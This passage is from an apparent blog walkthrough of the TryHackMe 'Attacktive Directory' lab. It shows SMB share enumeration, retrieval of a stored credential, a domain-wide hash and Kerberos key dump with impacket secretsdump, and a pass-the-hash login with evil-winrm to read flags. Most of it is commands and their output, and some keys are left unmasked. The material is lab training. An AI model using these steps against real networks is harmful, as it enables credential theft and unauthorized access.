1g 0:00:00:00 DONE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2020-11-03 21:45&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 16.66g/s 110933p/s 110933c/s 110933C/s horoscope..amy123
Use the &lt;span class=&quot;s2&quot;&gt;&quot;--show&quot;&lt;/span&gt; option to display all of the cracked passwords reliably
Session completed
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;found a password for the user “s&lt;strong&gt;**&lt;/strong&gt;*n”&lt;/p&gt;

&lt;h1 id=&quot;enumerating-the-dc-pt3&quot;&gt;Enumerating the DC pt3&lt;/h1&gt;

&lt;p&gt;For this step we will have a look at the SMB-Share. We can check if we can download a folder on the Share.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;fr3akazo1d💀fr3ak0ut&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/Pen-Testing/THM/Boxes/AttacktriveDirectory]
└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;smbmap &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; spookysec.local &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; spookysec.local &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; s&lt;span class=&quot;k&quot;&gt;*******&lt;/span&gt;n &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; m&lt;span class=&quot;k&quot;&gt;************&lt;/span&gt;5                                  1 ⨯
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: spookysec.local:445	Name: unknown                                           
        Disk                                                  	Permissions	Comment
	&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                  	&lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;	&lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
	ADMIN&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                           	NO ACCESS	Remote Admin
	b&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;p                                            	READ ONLY	
	C&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                               	NO ACCESS	Default share
	IPC&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                             	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can use metasploit for download a specific file from the b&lt;em&gt;**&lt;/em&gt;p folder.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf6 auxiliary&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;admin/smb/download_file&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; show options

Module options &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;auxiliary/admin/smb/download_file&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:

   Name         Current Setting         Required  Description
   &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;         &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;         &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
   FILE_RPATHS                          no        A file containing a list remote files relative to the share to operate on
   RHOSTS       10.10.124.175           &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The target host&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, range CIDR identifier, or hosts file with syntax &lt;span class=&quot;s1&quot;&gt;'file:&amp;lt;path&amp;gt;'&lt;/span&gt;
   RPATH        b&lt;span class=&quot;k&quot;&gt;****************&lt;/span&gt;s.txt  no        The name of the remote file relative to the share to operate on
   RPORT        445                     &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The SMB service port &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
   SMBDomain    spookysec.local         no        The Windows domain to use &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;authentication
   SMBPass      m&lt;span class=&quot;k&quot;&gt;************&lt;/span&gt;5          no        The password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the specified username
   SMBSHARE     b&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;p                  &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The name of a share on the RHOST
   SMBUser      s&lt;span class=&quot;k&quot;&gt;*******&lt;/span&gt;n               no        The username to authenticate as
   THREADS      1                       &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The number of concurrent threads &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;max one per host&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Or we can use smbclient to connect to the B*****p-Share and read the file on the share.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;fr3akazo1d💀fr3ak0ut&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/Pen-Testing/THM/Boxes/AttacktriveDirectory]
└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;smbclient &lt;span class=&quot;se&quot;&gt;\\\\&lt;/span&gt;spookysec.local&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;backup &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; s&lt;span class=&quot;k&quot;&gt;*******&lt;/span&gt;n                       
Enter WORKGROUP&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;vc-admin&lt;span class=&quot;s1&quot;&gt;'s password: 
Try &quot;help&quot; to get a list of possible commands.
smb: \&amp;gt; ls
  .                                   D        0  Sat Apr  4 21:08:39 2020
  ..                                  D        0  Sat Apr  4 21:08:39 2020
  b****************s..txt              A       48  Sat Apr  4 21:08:53 2020

		8247551 blocks of size 4096. 3879238 blocks available
smb: \&amp;gt; more ****************s..txt 
getting file \****************s..txt of size 48 as /tmp/smbmore.qexQe1 (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \&amp;gt; 
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;we now have a base64 hash, we can decode the hash and we have now the password for the b&lt;em&gt;**&lt;/em&gt;p user.&lt;/p&gt;

&lt;p&gt;With this user we cann run the script from impacket “secretdump.py” to get the hashes of everyuser on the domain.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;fr3akazo1d💀fr3ak0ut&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[/git/impacket/examples]
└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 secretsdump.py &lt;span class=&quot;nt&quot;&gt;-just-dc&lt;/span&gt; b&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;p@spookysec.local
Impacket v0.9.22.dev1+20201015.130615.81eec85a - Copyright 2020 SecureAuth Corporation

Password:
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Dumping Domain Credentials &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;:rid:lmhash:nthash&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0&lt;span class=&quot;k&quot;&gt;******************************&lt;/span&gt;c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:3&lt;span class=&quot;k&quot;&gt;******************************&lt;/span&gt;0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0&lt;span class=&quot;k&quot;&gt;******************************&lt;/span&gt;1:::
spookysec.local&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;kidy:1103:aad3b435b51404eeaad3b435b51404ee:5&lt;span class=&quot;k&quot;&gt;******************************&lt;/span&gt;4:::
spookysec.local&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;reakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5&lt;span class=&quot;k&quot;&gt;******************************&lt;/span&gt;4:::
spookysec.local&lt;span class=&quot;se&quot;&gt;\j&lt;/span&gt;ames:1105:aad3b435b51404eeaad3b435b51404ee:9&lt;span class=&quot;k&quot;&gt;******************************&lt;/span&gt;b:::
spookysec.local&lt;span class=&quot;se&quot;&gt;\o&lt;/span&gt;ptional:1106:aad3b435b51404eeaad3b435b51404ee:4&lt;span class=&quot;k&quot;&gt;******************************&lt;/span&gt;e:::
spookysec.local&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;herlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b&lt;span class=&quot;k&quot;&gt;******************************&lt;/span&gt;b:::
spookysec.local&lt;span class=&quot;se&quot;&gt;\d&lt;/span&gt;arkstar:1108:aad3b435b51404eeaad3b435b51404ee:c&lt;span class=&quot;k&quot;&gt;******************************&lt;/span&gt;7:::
spookysec.local&lt;span class=&quot;se&quot;&gt;\O&lt;/span&gt;ri:1109:aad3b435b51404eeaad3b435b51404ee:c&lt;span class=&quot;k&quot;&gt;******************************&lt;/span&gt;a:::
spookysec.local&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;obin:1110:aad3b435b51404eeaad3b435b51404ee:6&lt;span class=&quot;k&quot;&gt;******************************&lt;/span&gt;b:::
spookysec.local&lt;span class=&quot;se&quot;&gt;\p&lt;/span&gt;aradox:1111:aad3b435b51404eeaad3b435b51404ee:0&lt;span class=&quot;k&quot;&gt;******************************&lt;/span&gt;2:::
spookysec.local&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;uirland:1112:aad3b435b51404eeaad3b435b51404ee:3&lt;span class=&quot;k&quot;&gt;******************************&lt;/span&gt;5:::
spookysec.local&lt;span class=&quot;se&quot;&gt;\h&lt;/span&gt;orshark:1113:aad3b435b51404eeaad3b435b51404ee:4&lt;span class=&quot;k&quot;&gt;******************************&lt;/span&gt;4:::
spookysec.local&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;vc-admin:1114:aad3b435b51404eeaad3b435b51404ee:f&lt;span class=&quot;k&quot;&gt;******************************&lt;/span&gt;9:::
spookysec.local&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;ackup:1118:aad3b435b51404eeaad3b435b51404ee:1&lt;span class=&quot;k&quot;&gt;******************************&lt;/span&gt;8:::
spookysec.local&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-spooks&lt;/span&gt;:1601:aad3b435b51404eeaad3b435b51404ee:0&lt;span class=&quot;k&quot;&gt;******************************&lt;/span&gt;c:::
ATTACKTIVEDIREC&lt;span class=&quot;nv&quot;&gt;$:&lt;/span&gt;1000:aad3b435b51404eeaad3b435b51404ee:5&lt;span class=&quot;k&quot;&gt;******************************&lt;/span&gt;4:::
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:7&lt;span class=&quot;k&quot;&gt;**************************************************************&lt;/span&gt;8
Administrator:aes128-cts-hmac-sha1-96:e&lt;span class=&quot;k&quot;&gt;******************************&lt;/span&gt;e
Administrator:des-cbc-md5:2079ce0e5df189ad
krbtgt:aes256-cts-hmac-sha1-96:b&lt;span class=&quot;k&quot;&gt;**************************************************************&lt;/span&gt;c
krbtgt:aes128-cts-hmac-sha1-96:e&lt;span class=&quot;k&quot;&gt;******************************&lt;/span&gt;2
krbtgt:des-cbc-md5:b94f97e97fabbf5d
spookysec.local&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;kidy:aes256-cts-hmac-sha1-96:3&lt;span class=&quot;k&quot;&gt;**************************************************************&lt;/span&gt;4
spookysec.local&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;kidy:aes128-cts-hmac-sha1-96:4&lt;span class=&quot;k&quot;&gt;******************************&lt;/span&gt;3
spookysec.local&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;kidy:des-cbc-md5:b092a73e3d256b1f
spookysec.local&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;reakerofthings:aes256-cts-hmac-sha1-96:4&lt;span class=&quot;k&quot;&gt;**************************************************************&lt;/span&gt;5
spookysec.local&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;reakerofthings:aes128-cts-hmac-sha1-96:3&lt;span class=&quot;k&quot;&gt;******************************&lt;/span&gt;5
spookysec.local&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;reakerofthings:des-cbc-md5:7a976bbfab86b064
spookysec.local&lt;span class=&quot;se&quot;&gt;\j&lt;/span&gt;ames:aes256-cts-hmac-sha1-96:1&lt;span class=&quot;k&quot;&gt;**************************************************************&lt;/span&gt;2
spookysec.local&lt;span class=&quot;se&quot;&gt;\j&lt;/span&gt;ames:aes128-cts-hmac-sha1-96:0&lt;span class=&quot;k&quot;&gt;******************************&lt;/span&gt;6
spookysec.local&lt;span class=&quot;se&quot;&gt;\j&lt;/span&gt;ames:des-cbc-md5:dc971f4a91dce5e9
spookysec.local&lt;span class=&quot;se&quot;&gt;\o&lt;/span&gt;ptional:aes256-cts-hmac-sha1-96:f&lt;span class=&quot;k&quot;&gt;**************************************************************&lt;/span&gt;e
spookysec.local&lt;span class=&quot;se&quot;&gt;\o&lt;/span&gt;ptional:aes128-cts-hmac-sha1-96:0&lt;span class=&quot;k&quot;&gt;******************************&lt;/span&gt;0
spookysec.local&lt;span class=&quot;se&quot;&gt;\o&lt;/span&gt;ptional:des-cbc-md5:8c6e2a8a615bd054
spookysec.local&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;herlocksec:aes256-cts-hmac-sha1-96:8&lt;span class=&quot;k&quot;&gt;**************************************************************&lt;/span&gt;d
spookysec.local&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;herlocksec:aes128-cts-hmac-sha1-96:c&lt;span class=&quot;k&quot;&gt;******************************&lt;/span&gt;e
spookysec.local&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;herlocksec:des-cbc-md5:08dca4cbbc3bb594
spookysec.local&lt;span class=&quot;se&quot;&gt;\d&lt;/span&gt;arkstar:aes256-cts-hmac-sha1-96:3&lt;span class=&quot;k&quot;&gt;**************************************************************&lt;/span&gt;9
spookysec.local&lt;span class=&quot;se&quot;&gt;\d&lt;/span&gt;arkstar:aes128-cts-hmac-sha1-96:4&lt;span class=&quot;k&quot;&gt;******************************&lt;/span&gt;e
spookysec.local&lt;span class=&quot;se&quot;&gt;\d&lt;/span&gt;arkstar:des-cbc-md5:758af4d061381cea
spookysec.local&lt;span class=&quot;se&quot;&gt;\O&lt;/span&gt;ri:aes256-cts-hmac-sha1-96:5&lt;span class=&quot;k&quot;&gt;**************************************************************&lt;/span&gt;7
spookysec.local&lt;span class=&quot;se&quot;&gt;\O&lt;/span&gt;ri:aes128-cts-hmac-sha1-96:5&lt;span class=&quot;k&quot;&gt;******************************&lt;/span&gt;e
spookysec.local&lt;span class=&quot;se&quot;&gt;\O&lt;/span&gt;ri:des-cbc-md5:1c8f79864654cd4a
spookysec.local&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;obin:aes256-cts-hmac-sha1-96:8&lt;span class=&quot;k&quot;&gt;**************************************************************&lt;/span&gt;3
spookysec.local&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;obin:aes128-cts-hmac-sha1-96:7&lt;span class=&quot;k&quot;&gt;******************************&lt;/span&gt;8
spookysec.local&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;obin:des-cbc-md5:89a7c2fe7a5b9d64
spookysec.local&lt;span class=&quot;se&quot;&gt;\p&lt;/span&gt;aradox:aes256-cts-hmac-sha1-96:6&lt;span class=&quot;k&quot;&gt;**************************************************************&lt;/span&gt;0
spookysec.local&lt;span class=&quot;se&quot;&gt;\p&lt;/span&gt;aradox:aes128-cts-hmac-sha1-96:f&lt;span class=&quot;k&quot;&gt;******************************&lt;/span&gt;8
spookysec.local&lt;span class=&quot;se&quot;&gt;\p&lt;/span&gt;aradox:des-cbc-md5:83988983f8b34019
spookysec.local&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;uirland:aes256-cts-hmac-sha1-96:8&lt;span class=&quot;k&quot;&gt;**************************************************************&lt;/span&gt;7
spookysec.local&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;uirland:aes128-cts-hmac-sha1-96:2&lt;span class=&quot;k&quot;&gt;******************************&lt;/span&gt;a
spookysec.local&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;uirland:des-cbc-md5:cb8a4a3431648c86
spookysec.local&lt;span class=&quot;se&quot;&gt;\h&lt;/span&gt;orshark:aes256-cts-hmac-sha1-96:8&lt;span class=&quot;k&quot;&gt;**************************************************************&lt;/span&gt;6
spookysec.local&lt;span class=&quot;se&quot;&gt;\h&lt;/span&gt;orshark:aes128-cts-hmac-sha1-96:c&lt;span class=&quot;k&quot;&gt;******************************&lt;/span&gt;c
spookysec.local&lt;span class=&quot;se&quot;&gt;\h&lt;/span&gt;orshark:des-cbc-md5:a823497a7f4c0157
spookysec.local&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;vc-admin:aes256-cts-hmac-sha1-96:e&lt;span class=&quot;k&quot;&gt;**************************************************************&lt;/span&gt;8
spookysec.local&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;vc-admin:aes128-cts-hmac-sha1-96:a&lt;span class=&quot;k&quot;&gt;******************************&lt;/span&gt;f
spookysec.local&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;vc-admin:des-cbc-md5:2c4543ef4646ea0d
spookysec.local&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;ackup:aes256-cts-hmac-sha1-96:2&lt;span class=&quot;k&quot;&gt;**************************************************************&lt;/span&gt;2
spookysec.local&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;ackup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
spookysec.local&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;ackup:des-cbc-md5:d601e9469b2f6d89
spookysec.local&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-spooks&lt;/span&gt;:aes256-cts-hmac-sha1-96:c&lt;span class=&quot;k&quot;&gt;**************************************************************&lt;/span&gt;2
spookysec.local&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-spooks&lt;/span&gt;:aes128-cts-hmac-sha1-96:3&lt;span class=&quot;k&quot;&gt;******************************&lt;/span&gt;8
spookysec.local&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-spooks&lt;/span&gt;:des-cbc-md5:e&lt;span class=&quot;k&quot;&gt;**************&lt;/span&gt;9
ATTACKTIVEDIREC&lt;span class=&quot;nv&quot;&gt;$:&lt;/span&gt;aes256-cts-hmac-sha1-96:f&lt;span class=&quot;k&quot;&gt;**************************************************************&lt;/span&gt;6
ATTACKTIVEDIREC&lt;span class=&quot;nv&quot;&gt;$:&lt;/span&gt;aes128-cts-hmac-sha1-96:f&lt;span class=&quot;k&quot;&gt;******************************&lt;/span&gt;5
ATTACKTIVEDIREC&lt;span class=&quot;nv&quot;&gt;$:&lt;/span&gt;des-cbc-md5:1&lt;span class=&quot;k&quot;&gt;**************&lt;/span&gt;d
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Cleaning up... 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;elevating-privilages&quot;&gt;Elevating Privilages&lt;/h1&gt;

&lt;p&gt;Now we got the hashes we can try to login in to the target. 
I used for the first time “Evil-WinRM” this is very powerfull tool. i have to explain in more detail when i used it more.&lt;/p&gt;

&lt;p&gt;But for this room i followed the instaruction ont the github page.&lt;/p&gt;

&lt;p&gt;We can login with the has of the a&lt;strong&gt;**&lt;/strong&gt;*****r to the target and then get all the flags of the other user.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;fr3akazo1d💀fr3ak0ut&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/Pen-Testing/THM/Boxes/AttacktriveDirectory]
└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;evil-winrm &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; a&lt;span class=&quot;k&quot;&gt;***********&lt;/span&gt;r &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; 0&lt;span class=&quot;k&quot;&gt;******************************&lt;/span&gt;c &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 10.10.124.175                            127 ⨯

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint


&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;***********&lt;/span&gt;r&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ../Desktop
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;***********&lt;/span&gt;r&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt; &lt;span class=&quot;nb&quot;&gt;ls


    &lt;/span&gt;Directory: C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;***********&lt;/span&gt;r&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop


Mode                LastWriteTime         Length Name
&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                &lt;span class=&quot;nt&quot;&gt;-------------&lt;/span&gt;         &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-a----&lt;/span&gt;         4/4/2020  11:39 AM             32 root.txt


&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;***********&lt;/span&gt;r&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt; more root.txt
T&lt;span class=&quot;k&quot;&gt;******************************&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;***********&lt;/span&gt;r&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ../../
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&amp;gt; &lt;span class=&quot;nb&quot;&gt;ls


    &lt;/span&gt;Directory: C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers


Mode                LastWriteTime         Length Name
&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                &lt;span class=&quot;nt&quot;&gt;-------------&lt;/span&gt;         &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
d-----        9/17/2020   4:04 PM                a-spooks
d-----        9/17/2020   4:02 PM                A&lt;span class=&quot;k&quot;&gt;***********&lt;/span&gt;r
d-----         4/4/2020  12:19 PM                b&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;p
d-----         4/4/2020   1:07 PM                b&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;p.THM-AD
d-r---         4/4/2020  11:19 AM                Public
d-----         4/4/2020  12:18 PM                s&lt;span class=&quot;k&quot;&gt;*******&lt;/span&gt;n


&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&amp;gt; &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;b&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;p
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;p&amp;gt; &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;Desktop
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;p&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt; &lt;span class=&quot;nb&quot;&gt;ls


    &lt;/span&gt;Directory: C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;p&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop


Mode                LastWriteTime         Length Name
&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                &lt;span class=&quot;nt&quot;&gt;-------------&lt;/span&gt;         &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-a----&lt;/span&gt;         4/4/2020  12:19 PM             26 PrivEsc.txt


&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;p&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt; more PrivEsc.txt
T&lt;span class=&quot;k&quot;&gt;**********************&lt;/span&gt;y!&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;p&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt; &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ../../s&lt;span class=&quot;k&quot;&gt;*******&lt;/span&gt;n/Desktop
